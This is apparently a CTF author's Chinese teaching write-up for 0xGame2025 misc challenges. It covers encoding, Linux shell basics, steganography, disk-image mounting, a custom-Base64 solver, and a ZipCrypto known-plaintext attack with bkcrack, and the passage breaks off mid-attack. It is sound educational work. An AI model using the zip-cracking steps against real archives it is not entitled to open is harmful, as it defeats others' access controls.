---
layout: post
title: 0xGame2025 misc teaching
date: 2025-10-11 15:06 +0800
tags: 
  - 0xgame2025
categories: 
  - misc
image: /assets/img/backgrounds/0xGame海报2.png
---


我是0xGame2025的部分Misc的出题人，下面是针对misc方向的授课文案，希望能帮助刚踏上ctf路上的学弟学妹们快速入门

> 0xgame2025所有题目归档传送门如下
> [0xGame2025Week1](https://www.ctfplus.cn/learning/problem/excellent-problemSet/detail/1975497062459904000)
> [0xGame2025Week2](https://www.ctfplus.cn/learning/problem/excellent-problemSet/detail/1978130369429377024)


## Week1

### Sign_in

题目只给我们一串编码，遇到这类题，就把它复制到`cyberchef`这类自动化解密[工具](https://cyberchef.org/)（我们经常管它叫赛博厨子）中，工具会帮我们检测出编码类型

ps:我们在飞书上有准备`cyberchef`的离线版本，下载解压后点击那个html文件就能用

> 这里希望学弟学妹们能看到一种陌生的编码就进行简单的学习，万变不离其宗，只要掌握其中几种编码原理，其他的编码方式也就能快速上手了

简单说说工具的使用，请注意，如果这里output右侧出现魔法棒，就说明，工具已经检测出字符串的可能编码方式，点击即可

> 需要注意，该工具也有可能误判，如果说解密出来的东西不可读或者是别的错误情况，请及时的选择其他法子
{: .prompt-warning }
<img src="/assets/img/0xgame2025teching.assets/image-20250924174928073.png" alt="image-20250924174928073" style="zoom:50%;" />

Recipe中出现From base64，同时output也大变样，形式上很像我们要提交的flag



<img src="/assets/img/0xgame2025teching.assets/image-20250924175758659.png" alt="image-20250924175758659" style="zoom:50%;" />这里先讲解清楚Base64编码原理

#### base64编码原理

Base64编码是使用范围特别广的一种编码方式，不管是图片，文字，音频等各类文件，都可以通过base64编码处理，便携发送到网上进行传输

正常的Base64编码用到的字符集是（A-Z, a-z, 0-9, +, /）共64个字符，但是注意，'A'在字符集的索引值是0，'/'的索引值是63，中间的就按照顺序进行递增

编码原理如下，先将传输的信息转换成二进制，然后这里的二进制串都是8位的，接下来8位变6位，3个字母拆4组，接着6位二进制变十进制，然后按照十进制在Base64字符集中进行索引，上面说的3个字母拆4组，如果说拆的时候不够拆了，要用0填充，但是全是0的那组下面转换索引值后，用=号填充

下面是将明文flag转换成base64编码的原理示意图

<img src="/assets/img/0xgame2025teching.assets/pic_20250924184003_0.jpg" alt="pic_20250924184003_0" style="zoom:50%;" />


> 这里有个小结论，遇到`Zmxh`别迟疑，说不定就是flag的base64编码呢？还有昂，这里我一直说的是编码而不是加密，所以注意一个小细节，以后不要说base64加密
{: .prompt-info }

#### 凯撒密码原理

接下来拿到很像flag的字符串

```text
0hQkwo{Govm0wo_d0_0hQ4w3_2y25_@xn_r@mu_Pyb_peX}
0xGame{xxx}   #这一行给你们比对的
```

刷题数量足够多的话，能快速认识到，这个是凯撒密码这类的简单移位替换密码(仔细观察的话，会发现首字母的数字没变，符号没变，基本上就能往这里猜测了

加密原理就是将明文中的每个字母按照字母表顺序**向后（或向前）移动固定的位置**，得到密文。

> 加解密公式

- **加密**：`密文字母 = (明文字母位置 + 偏移量) mod 26`
- **解密**：`明文字母 = (密文字母位置 - 偏移量 + 26) mod 26`

所以说只要知道密文字母还有**shift**（偏移量）就能快速锁定明文字母

需要注意的地方如下：

凯撒密码进行替换的时候，应该先检测明文是大写还是小写

大写字母范围：`A(65)到Z(90)`

小写字母范围：`a(97)到z(122)`

由于这里的凯撒偏移指定在对应的大小写字母表中，所以我们的范围只有0-25的索引值，就是说，如果明文是大写，我们应该减去65，用得到的结果进行偏移，然后进行26取余确保结果依然在字母表中，然后再+65回到大写字母中，小写字母的解密操作是同样的原理

不过问题来了，我们这里并不知道shift，好在索引值为0-25，就26个选项，可以选择爆破，最坏的结果就是爆破到第26次，理论依据就是我上面说的，加上shift后，我们会对结果进行26取余，让最终得到的偏移值不会超过26

这里还是建议自己手搓凯撒爆破解密脚本

> 什么？！你代码也写不好？女孩子请找我，我来教你写；男孩子也可以来找我，我可以考虑给你梆梆一拳

```python
def exp(str,shift):
    result=""
    for char in str:
        if char.isupper():
            result+=chr((ord(char)-65-shift)%26+65)
        elif char.islower():
            result+=chr((ord(char)-97-shift)%26+97)
        else:
            result+=char

    return result
def solver(str):
    for i in range(26):
        a=exp(str,i)
        if a.startswith("0xGame"):
            print(a)
            break

if __name__=="__main__":
    solver("0hQkwo{Govm0wo_d0_0hQ4w3_2y25_@xn_r@mu_Pyb_peX}")
#0xGame{Welc0me_t0_0xG4m3_2o25_@nd_h@ck_For_fuN}
```

### 公众号原稿

首先要知道一些前置知识

`.docx`文件的本质就是zip压缩包，与此类似的可读的文档（压缩包）格式有.xlsx和.pptx

这是微软从office 2007开始引入的新的默认格式，遵循一个名为“**开放打包约定**”(Open Packaging Conventions,简称OPC)。

在这个约定下，我们可以将一个`.docx`文件看成“披着Word外衣的ZIP压缩包”

关于约定格式上的细节，大家可以自己研究下，只需要知道，下次遇到这类题后，可以尝试将后缀名改成zip，解压看看有没有什么特殊的文件在里面

```bash
[Content_Types].xml
_rels/
docProps/
    app.xml
    core.xml
word/
    document.xml      <-- 这里存放文档的主要文字内容
    styles.xml        <-- 这里存放样式信息
    media/
        image1.png    <-- 你插入的图片就在这里
    theme/
    _rels/
    ...
```

一般来说，解压**.docx**文件后，它的文件目录如上

本题中，你们解压后会在`docProps/`目录下看到gift.xml，而这就是我为你们准备的flag

<img src="/assets/img/0xgame2025teching.assets/2025-09-24-22-16-18-image.png" alt="2025-09-24-22-16-18-image" style="zoom:50%;" />

### ez_shell

> > 注意：本题是SSH容器连接题目
>
> 本题是一道帮助新生接触Linux命令的引导题，其他佬可以跳过下面的引导部分，需要提交的flag组成如下：
>
> - `whoami`命令的结果
> - `pwd`命令的结果
> - 当前路径下的文件夹名（除去上级路径和当前路径符号
> - 该文件夹下面的flag1.txt文件内容
> - `/root`下的flag2.txt文件内容
>
> 上述结果需要用'_'连接，然后用0xGame{}包裹，最终flag样例：`0xGame{who_pwd_xxx_xxx_xxx}`
>
> 会用到的信息：
>
> - **ssh**连接：`hacker/h@cker_it`
> - **root**用户：`root/Y0u_@re_root`

---

如何如何👀？

是第一次接触shell吗，解决不了的话，我来教你,这里有个[Linux命令大全](https://www.linuxcool.com/)，先放这，猜你不会仔细看，好好看看我下面的引导步骤吧，敲黑板昂！！！

<div align="right">
<img src="/assets/img/0xgame2025teching.assets/如何？.jpg" alt="如何？" style="width:30%;">
</div>




#### 引导

> 也许我有没说明白的点，可以随时找我，或者自行研究解决

遇到这样的`tcp`容器题目，需开启容器，会得到类似这样的内容`nc1.ctfplus.cn 34857`

前面部分可以是IP地址也可以是域名，后面的数字是端口号，注意，中间是空开的，和http的':'连接有所差异

常见的tcp服务是使用**netcat**这样的工具进行nc连接的，但是题目描述中，说到了，这个是ssh容器题目，而且给出了连接账密，需要我们通过ssh进行远程连接

---

- step1 进入shell

在终端中输入:

```bash
ssh hacker@nc1.ctfplus.cn -p 34857
```

`tips:powershell,cmd,linux终端等都可以滴`

一般来说，ssh服务是用默认端口22连接的，就是说在平时连接靶机的时候可以不用-p指定端口，而这里是由于docker容器进行了端口转发才需要我们指定对应的端口号进行连接

上面看不懂问题不大，需要清楚一点，连接ssh需要指定靶机上有远程连接权限的用户，比方说本题中，只有hacker用户能ssh连接，root不可以

```bash
ssh hacker@nc1.ctfplus.cn -p 34857
The authenticity of host '[nc1.ctfplus.cn]:34857 ([103.85.86.154]:34857)' can't be established.
ED25519 key fingerprint is SHA256:heNboAPQQACbtUAWuJK45JXDMmx2YFFmYkGyVhd17e0.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[nc1.ctfplus.cn]:34857' (ED25519) to the list of known hosts.
hacker@nc1.ctfplus.cn's password:
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See <https://wiki.alpinelinux.org/>.

You can setup the system with the command: setup-alpine

You may change this message by editing /etc/motd.

dep-428f3ef5-705a-4364-a5ee-e59fc8e1fc00-5d4c55ff4b-gpflw:~$
```

回车运行命令后会出现一大段安全验证的信息，不用管，大致意思是说本电脑第一次连接该服务器，主机列表中找不到对应的身份记录，然后输出了服务器的公钥指纹，用来验证服务器身份的，这个时候，我们需要输入`yes`来同意连接，然后服务器公钥会保存在本地~/.ssh/known_hosts文件中，下次连接的时候就不会触发警告

接下来是输入密码`h@cker_it`，这里你们会不会因为看不到输入的内容误以为机器出问题了？O(∩_∩)O

这是Linux系统出于安全考虑的设计，为了防止旁观者在我们输入密码时看到任何视觉反馈（包括星号、圆点等）但是我们的每一次输入都是被正常记录的，所以一定要注意不要打错字哦，复制进去也是可以的（这个设计熟悉就好，几乎所有Linux系统都是这样的，就好比手机某网站的登录页面，输入密码全用"·"进行替代

登录后看到类似`hostname:~$` 的字样，就表示我们登录成功，那么恭喜你第一次进入shell成功了🥳🥳🥳

- step2 开始答题

所有Linux的基础命令都一样的，详细介绍还是请看我上面放置的网页链接,下面仅仅讲述题目中要用到的命令，也是我们经常用的

-- whoami

很显然，是who am i（我是谁），用途是显示当前用户名

```bash
yolo@yolo:~$ whoami
yolo
```

-- pwd

print working directory，功能是显示当前工作目录的绝对路径

```bash
yolo@yolo:~$ pwd
/home/yolo
```

-- ls

真是最最常用的命令，用途是列出当前路径下的文件及其属性信息，但是经常要结合参数使用

```
yolo@yolo:~$ ls
yolo@yolo:~$ ls -la
total 12
drwxr-xr-x  3 yolo yolo 4096 Sep 26 17:58 .
drwxr-xr-x 11 yolo yolo 4096 Sep 26 17:56 ..
drwxr-xr-x  2 yolo yolo 4096 Sep 26 17:58 .secret
```

第一个ls会单纯列出正常无隐藏的文件名或文件夹名，在Linux中，像.xxx这样的，名字前面是'.'的文件或文件夹会被系统默认隐藏，需要使用-a显示所有文件，包括隐藏的；-l会列出文件的属性，包括文件类型、权限、编辑时间、所有者等等

> 这里的.代表的是当前目录，是一种相对路径，..代表的是上一级路径，前面的**drwxr-xr-x**交给你们自己研究

-- pwd

本命令可以改变当前路径，和我们在Windows桌面双点某文件夹进去看里面的内容的操作类似

```
yolo@yolo:~$ pwd
/home/yolo
yolo@yolo:~$ cd .secret
yolo@yolo:~/.secret$ pwd
/home/yolo/.secret
```

-- cat 

本命令可以读取指定文件的内容，正常来说，推荐用cat读取那些小点的，纯文本的文件，比方说flag.txt这样的，其他情况下，有其他命令可以用，比如more,less等等，自个研究昂

```
yolo@yolo:~/Desktop/.secret$ ls
flag1.txt
yolo@yolo:~/Desktop/.secret$ cat flag1.txt
congratulation!
```

-- su root

Linux对于权限的概念很严格（当然Windows同样，只是不常见

一些文件或路径，需要高权限乃至root用户才能进入，这个时候，我们需要使用su xxx指定切换用户，同样需要使用登录密码

```
yolo@yolo:~/.secret$ cd /root
-bash: cd: /root: Permission denied
yolo@yolo:~/.secret$ su root
Password:
root@yolo:/.secret# cd /root
root@yolo:~# pwd
/root
```

这里我给用户同样设置了不用密码的sudo权限，允许用户yolo不输入密码的情况下直接执行root权限命令

```
yolo@yolo:~/.secret$ id
uid=1000(yolo) gid=1000(yolo) groups=1000(yolo)
yolo@yolo:~/.secret$ sudo su
root@yolo:/home/yolo/.secret# id
uid=0(root) gid=0(root) groups=0(root)
root@yolo:/home/yolo/.secret# cd /root
root@yolo:~# cat flag2.txt
hacker!
```

- step3 合成flag

```
0xGame{yolo_/home/yolo_.secret_congratulation!_hacker!}
```



> 我猜真有人把上面的flag交上去了吧，梆梆锤你呢，自个做一遍，熟悉下，然后这里学长给出建议，一定要多用，越学到后面，我们的命令行工具使用的就越多，而且，在终端上操作没有一种黑客体验感吗？多cool!

<div align="center">
<img src="/assets/img/0xgame2025teching.assets/7c3be7774e8d988c5409a15e55949b22.jpg" alt="cool" style="width:30%;">
</div>



### Zootopia

这个题的考点很基础，是png图片的LSB隐写，下面就简单说说lsb的隐写原理，如果对其他png隐写方法感兴趣，可以看看这篇[博客](https://www.yo1o.top/2025/04/13/png-challenge/)

> 嗯，没错，是我写的

#### lsb原理

首先有个大概的理解，在png图片中，一个像素点在文件数据中存储的大小是三个字节，比较常见的模式是按照rgb进行存储的（模式有很多种，但是rgb确实是最常见，其他的模式对应的隐写原理和下面的一样

rgb三个颜色通道的范围都是`[0-255]`
> warning@别记岔了！！！
{: .prompt-warning }

```text
几个常见的颜色
红色：(255,0,0)
绿色：(0,255,0)
蓝色：(0,0,255)
白色：(255,255,255)
```

然后在文件内部，数据是按照8位二进制进行存储的，比方说某个像素点的值是(111,222,225)，那么在存储中，对应的值是(01101111,11011110,11100001)

然后这里，我们定义每个8位二进制的最后一位为`LSB`  (**Least Significant Bit**,最低有效位)

所谓的lsb隐写就是对每个二进制的最低有效位进行编辑，使用01二进制进行隐写信息，可以藏文件，也可以藏字符串，同样，颜色通道的选择也很多样性，可以仅仅对R通道进行隐写，也可以选择两个以上......

在lsb的原理基础上，颜色通道隐写还能拓展到其他的通道中，也就出现了`MSB` (**Most Significant Bit**,最高有效位)或者其他混乱通道隐写（组合起来很多，不过原理都是一样的

> 编者补充：lsb隐写相对msb而言，有个显著的优势，那就是对整个画面影响不大，或者说我们肉眼几乎看不清隐写前后的差异

#### 解密LSB

解决方式很多，由于lsb的提取稍微麻烦点，我们这里就不细说脚本怎么搓（写提取脚本老麻烦了呢

推荐的解密工具有`Stegsolve`,`Zsteg`

##### stegsolve

前者是有可视化界面的提取通道隐写的工具，同样也有对单个颜色通道提取查看图片的功能，还有xor等等操作，目前来看，我感觉这个最好用

<img src="/assets/img/0xgame2025teching.assets/image-20251001160837872.png" alt="image-20251001160837872" style="zoom:50%;" />

先导入图片（你把png图片给拉进去也没问题

**Analyse->Data Extract->勾选Red,Green,Blue三个通道的最后一位->选中LSB First(虽说感觉没用)->Preview**

通过上述操作，我们能看到文件最前面隐藏了flag，但是在当前情况下，直接复制，会顺带把左边的十六进制数据复制到，建议把preview上面的`Include Hex Dump In Preview`取消勾选，重新Preview下，就好复制flag了（复制出来的结果中间有空格，自行删减就好

##### zsteg

后者是命令行工具，可以帮我们检测多个颜色通道可能有的隐写信息，提取也很好提

正常来说，直接`zsteg xxx.png`可以显示大部分可读的颜色通道隐写的部分内容，然后一些情况下，我们可能会发现稍大文件被隐写进去，这时候我们需要使用**-E xxx<通道组合>** 来完整提取隐写数据到文件中

<img src="/assets/img/0xgame2025teching.assets/image-20251001161738864.png" alt="image-20251001161738864" style="zoom:50%;" />

```text
0xGame{W1_Need_t0_t@k3_a_break}
```

### ezshell_PLUS

本题是ezshell的进阶，就是看看大家的自学能力如何，下面我给出我的步骤

<img src="/assets/img/0xgame2025teching.assets/image-20251001163833641.png" alt="image-20251001163833641" style="zoom:50%;" />

```bash
sha256sum files/* | grep -i "021832def36ccd081b38d8fd51b534d70826b5df4423ce2c15386797ab08bef8"
```

我猜测这里让你们感觉新奇吧，就是用了个管道符，让前一步的输出作为后一步的输入

然后用到了sha256sum，grep命令，这些也很常见，分别是计算哈希和查找

然后这里有个”*“，它被叫做通配符，可以匹配任意字符

> 学长只能说，多见多学多用，命令行用熟悉，会对后面的学习帮助很大

### Do not enter

本题考察了dd镜像挂载与分析

我们首先用file命令查看镜像的基本结构

```bash
file do_not_enter.dd
do_not_enter.dd: DOS/MBR boot sector; partition 1 : ID=0x83, start-CHS (0x10,0,1), end-CHS (0x28f,3,32), startsector 2048, 81920 sectors; partition 2 : ID=0x83, start-CHS (0x2a0,0,1), end-CHS (0x3ff,3,32), startsector 86016, 81920 sectors; partition 3 : ID=0xf, start-CHS (0x3ff,3,32), end-CHS (0x3ff,3,32), startsector 169984, 178176 sectors
```

从输出可以看出，**do_not_enter.dd**是一个MBR（主引导记录）格式的磁盘镜像，包含一个引导扇区和三个分区

- 分区1和2是Linux原生分区（类型0x83)
- 分区3是扩展分区（类型0x0f),通常用于容纳更多逻辑分区

上面看不懂问题不大，反正和下面的解题过程没多少关系，做多了，就会有更深的体会(●'◡'●)

> 💡 小知识：MBR 是一种较老但广泛支持的分区方案，现代系统更多使用 GPT，但大多数 Linux 工具（如 `fdisk`、`mount`、`losetup` 等）依然能很好地处理 MBR 镜像。
> 如果你还不熟悉“引导扇区”“分区表”这些概念，没关系！你可以简单把它理解为：**这个 `.dd` 文件就像是把一整块硬盘“拍了张快照”保存下来了**。我们要做的，就是用合适的工具把这个“虚拟硬盘”挂载到系统里，像打开普通文件夹一样去查看里面的内容。

#### 做法

**第一步：创建循环设备映射**

```
sudo losetup -fP do_not_enter.dd
```

命令解释：

- losetup:linux下的循环设备管理工具，能将文件虚拟成块,换句话说，就是把一个dd文件转换成机器磁盘可以读的格式
- -f:自动查找第一个可用的loop设备
- -P：关键参数！让内核在关联后重新扫描分区表，自动创建分区设备节点
- 作用：将DD镜像文件虚拟成一个”硬盘“，系统会识别出其中的分区结构

**第二步：验证设备映射状态**

```
sudo losetup -a
```

命令解释：

- -a:显示所有活跃的loop设备状态

**第三步：识别分区结构与标签**

```
lsblk -f /dev/loop0 #后面的/dev/loop0是通过第二步得到的
```

命令解释：

- lsblk:列出块设备信息的专业工具
- -f:显示文件系统信息，包括分区标签
- 我的考点其实就是这里，就像题目说的那样，我们应该选中那个do_not_enter的标签

**第四步：挂载目标分区**

```
mkdir -p /mnt/test
sudo mount /dev/loop0p2 /mnt/test
```

命令解释：

- mount:标准的文件系统挂载命令
- /dev/loop0p2:我们要挂载的分区设备 #这里的参数是通过第三步得到的
- /mnt/test：我们设置的挂载点目录
- 底层原理：将分区中的ext4文件系统挂载到目录树，使文件可访问

**第五步：搜索flag内容**

```
sudo grep -r "0xGame" /mnt/test
```

命令解释：

- grep:强大的文本搜索工具
- -r:递归搜索，遍历目录下的所有文件
- "0xGame":flag头

**第六步：清理**

```
sudo umount /mnt/test
sudo losetup -d /dev/loop0
sudo rmdir /mnt/test
```

本题还有其他工具能快速挂载，比如说**kpartx**

然后关于**blkid**，也能用它来读取那个分区的标签，在某些情况下，它可以和**lsblk**换着用

| 特性         | **`blkid`**                         | **`lsblk`**                      |
| ------------ | ----------------------------------- | -------------------------------- |
| **主要功能** | 读取**文件系统**的元数据和属性      | 显示**块设备**的拓扑结构和关系   |
| **数据来源** | 读取文件系统的超级块(superblock)    | 查询内核的块设备信息(sysfs)      |
| **输出视角** | **文件系统视角**                    | **设备拓扑视角**                 |
| **信息类型** | 文件系统特定属性(UUID, LABEL, TYPE) | 设备层次关系(父子、大小、挂载点) |
| **使用场景** | 按属性识别和挂载文件系统            | 理解磁盘分区结构和布局           |

然后下面是我给出的参考步骤，可以看出在正确步骤下，我们只能找到一个完完整整的flag的，fake flag真的一点也没为难大家的（盲猜有人说我胡乱塞东西，哈哈

```bash
~$ sudo losetup -fP do_not_enter.dd
~$ sudo losetup -a
/dev/loop0: [2096]:536444 (/home/yolo/Desktop/timu/0xGame_challenge/do_not_enter.dd)
~$ lsblk -f /dev/loop0
NAME      FSTYPE FSVER LABEL        UUID                                 FSAVAIL FSUSE% MOUNTPOINTS
loop0
├─loop0p1 ext4   1.0   UserShare    5a6be8f0-43f9-4020-a729-510d6d57e95b
├─loop0p2 ext4   1.0   Do_not_enter 643298ec-2a07-4681-9555-addf90de8ae1
├─loop0p3
├─loop0p5 ext4   1.0   WebServer    f965eed6-3de2-4533-8e06-2c816f9e4574
└─loop0p6 ext4   1.0   SysLogs      650ce632-c57e-41c6-8a3b-c6bf3d4e2193
~$ sudo mount /dev/loop0p2 /mnt/test
~$ sudo grep -r "0xGame" /mnt/test
/mnt/test/syslog:0xGame{WoW_y0u_fouNd_1t?_114514}
~$ sudo umount /mnt/test
~$ sudo losetup -d /dev/loop0
~$ sudo rmdir /mnt/test
```

<img src="/assets/img/0xgame2025teching.assets/image-20251002010301159.png" alt="image-20251002010301159" style="zoom:50%;" />

一些其他工具（Windows，本意还是让大家掌握dd镜像挂载方式，但是赖我，没有给大家说清楚，应该关注分区标签，为各位师傅解题时候造成困扰感到抱歉

- AXIOM

<img src="/assets/img/0xgame2025teching.assets/image-20251009225550160.png" alt="image-20251009225550160" style="zoom:50%;" />

- DiskGenius

<img src="/assets/img/0xgame2025teching.assets/image-20251009225621434.png" alt="image-20251009225621434" style="zoom:50%;" />

- R-Studio

<img src="/assets/img/0xgame2025teching.assets/image-20251009225641928.png" alt="image-20251009225641928" style="zoom:50%;" />

#### 学长碎碎念

关于本题，我设置了180个fake flag，目的就是希望新生们采取专业工具科学地进行分析，而不是使用strings暴力手撕，然后在Windows这边，有人用axiom能读出标签名，我测试过autopsy，发现不能显示分区标签，而且一些选手和我聊过，他们用火眼、取证大师等等著名一把梭取证工具也没能解决出来（~~可见我出的题还蛮好~~ ，其实是希望学弟学妹们在后面的学习中，会遇到越来越多的一把梭脚本或者说是妙妙小工具，我并不排斥使用的，但是！我希望你们能掌握对应的原理并亲手用自己的"笨"方法解决出一两道后再选择是否使用所谓的“一把梭”，不然，没了好用的神奇小工具，你还能做出什么呢？

> 在我看来，一把梭工具应该被用在重要赛事抢血上，而不是简单小比赛上冲榜用的

接下来关于AI，这个是近年来最热门的东西，有了ai，对你们入门ctf的帮助会非常非常大，不用觉得啥事都问ai会不好意思，因为我也最开始啥也不懂，这样过来的。所以还是很鼓励大家学习新知识的时候，先自己研究，卡住的话询问ai解决方案，接下来才是找圈子内厉害的师傅（一定要整理并描述清楚自己遇到的问题，不然对他们来说，帮你解惑的难度会上一个档次,haha

然后每次从ai那里拿到解决方案，希望你们能从中学习到一些，而不是无脑的**ai说啥你干啥**，不然下次遇到类似的问题，我们再问一遍AI？这也就带出了我下面给大家的忠告：一定`合理`使用AI，趁着AI在旁边，我们多通过它学习一些新知识，等我们用不了的情况下，也不会手足无措（想象这样一个情景，如果说你啥事只会问ai，那么你所做的事情是不是任何人都能替代？是不是说你失去了ai，会一点竞争力都没有？

## Week2

> 从week2开始，赛题难度上升，这也就意味着大家需要提升学习效率，争取在短时间内学会更多的知识点

### 这个b64不太对啊


> 小拓展
{: .prompt-success }


> 交互出现的中文乱码对解题没有任何影响，但是为了解题体验，可以选择下述方式优化：
> 优先建议使用Linux的终端，wsl2,虚拟机均可，它们支持utf-8
> 如果是使用cmd，请nc连接容器之前，输入`chcp 65001`回车，将编码方式从gbk切换成utf-8后再nc连接
> 如果说是powershell，这个稍微麻烦点
> 需要实现操作如下：依次将下面三个命令输入到powershell中
> `chcp 65001`
> `[Console]::InputEncoding = [System.Text.Encoding]::UTF8`
> `[Console]::OutputEncoding = [System.Text.Encoding]::UTF8`



> 本题可以变相的看作一道密码简单题，既然想学misc，各个方向都要有所了解

base64原理，我给大家在week1上讲的很清楚了，然后本题的考法是将字符集索引表自定义，选手们需要通过将明文和密文进行对比，反推字符集，获取flag，这里面是有多种解决方法的，一个一个字符进行手动拼接也可行，不过我下面讲解一个相对高效的方法：

我们先回顾base64编码原理

```text
三个字节转换为24位的二进制数据，然后分割整理成4组6位二进制，将它们转换成十进制作为索引值，最后就是在base64字符集中找到对应的密文字符进行拼接。

这里有个结论，那就是3个明文字符编码后一定会得到4个字符的密文，且不可能出现=作为填充。

ps：如果你在 Linux 中用 echo "abc" | base64 会得到带 = 的结果，那是因为 echo 默认会在字符串末尾添加一个换行符 \n，导致实际输入是 4 个字节（abc\n），而 Base64 对非 3 的倍数字节会填充 =。若使用 echo -n "abc" | base64 或 Python 的 base64.b64encode(b"abc")，就不会有填充。
```

在 Base64 编码中，每3个字节被划分为4个6位组。其中，**第4个6位组完全由第3个输入字节的低6位构成**（因为前两个字节共16位，只能影响前3个6位组）。因此，无论前两个字节是什么，只要固定它们，改变第3个字节，第4个输出字符就只由第3字节的低6位（即 `byte3 % 64`）决定。（所以说 `'AA'` 完全是占位符，你可以用任意两个可打印字符代替，比如 `'BB'`、`'!!'` 等，只要保持固定即可。

下面我们拿AAX举例（标记：这里的X是任意可打印字符,然后AA仅仅是用来占位

```text
已知：A：ASCII值为65
     X:ASCII值[33,126],只要是可打印字符都可，我们下面转换二进制的时候用'x'代替(x只能取值0或1

  明文   |   A     |    A     |    X
8位二进制 |01000001 | 01000001 | xxxxxxxx
我们拿正常字符集顺序(A-Z,a-z,0-9,+,/)进行举例
A(65),/(47)
举例一：
   A        A         A
01000001 01000001 01000001
010000 010100 000101 000001
  16     20     5      1    <----这里的索引值是1没有任何问题，字符集索引是从0开始的
   Q      U     F      B    <----这里，B正好是标准字符集的第二个

举例二：
   A        A         /
01000001 01000001 00101111
010000 010100 000100 101111
  16     20     4      47    <----这里的索引值是47
   Q      U     E      v    <----这里，v正好是标准字符集的第48个
```

大家有没有看出来什么？

> 感觉还是很懵逼的话，可以手上算算，划拉一下，一定能有所悟

我这里稍微归纳整理了下，使用第3个字母的ASCII值直接对64进行取余运算，拿到的值就是第4个密文的索引值，其中的数学原理和上面举的例子（取低6位）是一样的，比如说A(65)，对64进行取余的结果是1，然后/(47)，对64取余是47，计算结果完全是低6位转换十进制的结果

*脚本的核心原理：**Base64 编码后第4个字符的索引值，等于第3个输入字节的低6位（即 `byte3 % 64`）**。*

```python
import base64
import string
from pwn import *

HOST = 'nc1.ctfplus.cn' 
PORT = 38453 

def solve():
    try:
        p = remote(HOST, PORT)
    except PwnlibException as e:
        print(f"[ERROR] 无法连接到服务器 {HOST}:{PORT}. 错误: {e}")
        return

    
    p.recvuntil(b'Choose an option (1/2): ')
    p.sendline(b'1')
    p.recvuntil(b'> ')

    
    charset_map = {}
    PROBE_START = 33
    PROBE_END = 96 #33 + 64 - 1 = 96，连续64个ASCII字符足以覆盖所有 (i % 64) 的可能值
    
    i = PROBE_START
    while len(charset_map) < 64:
      
        if i > PROBE_END:
            # 理论上不可能触发的
            p.error("FATAL: Failed to discover all 64 characters within the visible range (33-126). Aborting.")
            p.close()
            return

        probe_char = chr(i)
        # 'AA' + 探测字符 X
        probe_data = ('AA' + probe_char).encode('ascii')

        p.sendline(probe_data)
        
        p.recvuntil(b'Result: ')
        encoded_result = p.recvline().strip().decode()
        
        if len(encoded_result) < 4:
             p.warn(f"i={i} ({probe_char}): Unexpected result length {len(encoded_result)} ('{encoded_result}'). Skipping.")
             i += 1
             continue
        
        # 精确提取第 4 个字符 (索引 3)
        target_char = encoded_result[3]

        target_index = i & 0x3f #0x3f = 63，位运算取最后6位 
        #target_index = i % 64  #上下两种写法等价，取余运算，本质上都是直接拿到低6位
 #一些数学上的解释：因为 64 是 2 的幂，i % 64 等价于取 i 的低 6 位，即 i & 0x3F，位运算更快
        
        if target_index not in charset_map:
            # 严格排除填充字符 '='
            if target_char == '=':
                 p.warn(f"i={i} ({probe_char}): Encountered unexpected '=' character. Skipping this index {target_index}.")
                 i += 1
                 continue
                 
            charset_map[target_index] = target_char
        
        print(f"\r[*] Progress: {len(charset_map)}/64 discovered", end="")
        i += 1

    print("\n[+] Charset map fully discovered!")
    final_charset = "".join(charset_map.get(k, '?') for k in range(64))

    if '?' in final_charset:
        p.error(f"Build failed. Resulting charset is incomplete: {final_charset}")
        p.close()
        return
        
    if len(set(final_charset)) != 64:
        p.error(f"Build failed. Resulting charset contains duplicates or invalid chars: {final_charset}")
        p.close()
        return

    p.success(f"Reconstructed charset: {final_charset}")
    p.sendline(b'!q')
    p.recvuntil(b'Choose an option (1/2): ')
    p.sendline(b'2')
    p.recvuntil(b'Your charset guess: ')
    p.sendline(final_charset.encode())
    
    p.success("Charset submitted! Receiving flag...")

    flag_output = p.recvall(timeout=2).decode()
    print("\n" + "="*20 + " FLAG " + "="*20)
    print(flag_output)
    print("="*46)
    
    p.close()

if __name__ == "__main__":
    solve()
```

> 解决方式真的很多，Spreng师傅还有个纯密码测试脚本，如果对这个知识点感兴趣可以和他探讨一二

### 开锁师傅

本题是zip压缩包攻击分类中的明文攻击，可以看到的，压缩包中存在一个png图片，一些png文件结构相关的知识，请上网搜索

我们会用到的部分知识是png有固定的魔数头：`89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52`

<img src="/assets/img/0xgame2025teching.assets/20251013231154_006.webp" alt="image-20251007130940004" style="zoom:50%;" />

可以说，所有正常的png文件头，前面这16字节一定是一样的，分别是文件魔数标志以及IHDR数据块的名称，大家可以自己动手看看

接下来说说明文攻击实现的利用方法

> 关于明文攻击的实现原理，可以参考这位佬的博客文章https://flandre-scarlet.moe/blog/1685/

简单说明，实现zip明文攻击的前提分别是：

- 压缩包的压缩方式必须是ZipCrypto加密（deflate或Store模式均可）
- 必须已知8字节的连续明文和对应偏移，进行恢复密钥，然后还需要4字节明文参与密钥验证，4字节明文可以与8字节明文不连续，明文知道越多，解密速度越快

正常而言，我们使用bkcrack工具进行明文攻击居多

#### how to solve

- step 1

我们先使用-L查看压缩包的详细信息，发现它们是ZipCrypto加密方式的Store压缩模式，然后观察到里面就两个文件，其中一个就是我们需要利用的png

```
$ bkcrack -L attachment.zip
bkcrack 1.8.0 - 2025-08-18
Archive: attachment.zip
Index Encryption Compression CRC32    Uncompressed  Packed size Name
----- ---------- ----------- -------- ------------ ------------ ----------------
    0 ZipCrypto  Store       e7b7038a           80           92 flag.txt
    1 ZipCrypto  Store       04a6dc2d     10149855     10149867 huiliyi.png
```

- step 2

接下来我们需要想办法创造bkcrack可以利用的明文（显然不能用上面你们直接看到的8950啊，这个是给我们看的，但是给bkcrack看的话，就要用源数据处理

```
$ echo 89504E470D0A1A0A0000000D49484452 | xxd -r -ps >pngheader
$ cat pngheader
�PNG
␦
IHDR
```

- step 3

接下来是直接开始明文攻击，简单说明，-C指定的是加密压缩包，-c指定了我们明文攻击利用的文件（我们已知部分明文的文件），-p指定的是我们要利用的明文

这里没有给指定偏移，完全是因为我们利用的明文是png文件头，bkcrack会默认从文件头也就是偏移量0开始进行攻击，如果需要指定偏移，需要使用-o

```
$ bkcrack -C attachment.zip -c huiliyi.png -p pngheader
bkcrack 1.8.0 - 2025-08-18
[13:59:25] Z reduction using 9 bytes of known plaintext
